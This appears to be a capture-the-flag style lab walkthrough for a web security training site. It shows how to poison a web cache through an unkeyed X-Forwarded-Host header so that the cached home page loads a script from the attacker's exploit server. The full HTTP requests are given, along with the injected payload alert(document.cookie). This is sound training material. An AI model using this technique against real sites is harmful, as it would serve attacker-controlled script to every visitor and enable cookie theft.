Task 1:
///Lab: Web cache poisoning with an unkeyed header///

Open the page, and send the GET / request to the repeater.
In this request in the response there is the three line:
Cache-Control: max-age=30
Age: 0
X-Cache: miss
If we send the request again, it changes:
Cache-Control: max-age=30
Age: 1
X-Cache: hit
Okay. Now modify the request: 
GET /?ab=asd HTTP/2

And in response we got:
Cache-Control: max-age=30
Age: 0
X-Cache: miss

Because we are generating a new cache key. Go to exploit server.
Now. In repeater (since 'This lab supports the X-Forwarded-Host header.') add a new line with the X-Forwarded-Host header like this:
GET /?ab=abcde HTTP/2
Host: 0a72006a0473c9cf86a894c2000c0037.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Priority: u=0, i
Te: trailers
X-Forwarded-Host: exploit-0ae500f204abc99086f893dd019b00dd.exploit-server.net >>>this is our exploit servers address

Send this two times (store it). In the response source code you will see this part:
   <body>
        <script type="text/javascript" src="//exploit-0ae500f204abc99086f893dd019b00dd.exploit-server.net/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js">

So the script will looking forward to a file (/resources/js/tracking.js) from our server, so in the exploit server settings change the 'File:' to /resources/js/tracking.js, and into body type what the lab wants:
'alert(document.cookie);'
Then click on store.
All we have to now is in the repeater remove the ?ab=abcde part from the request like:
GET / HTTP/2
Host: 0a72006a0473c9cf86a894c2000c0037.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
....
....
Priority: u=0, i
Te: trailers
X-Forwarded-Host: exploit-0ae500f204abc99086f893dd019b00dd.exploit-server.net
Send it two times, and in browser refresh the front page.

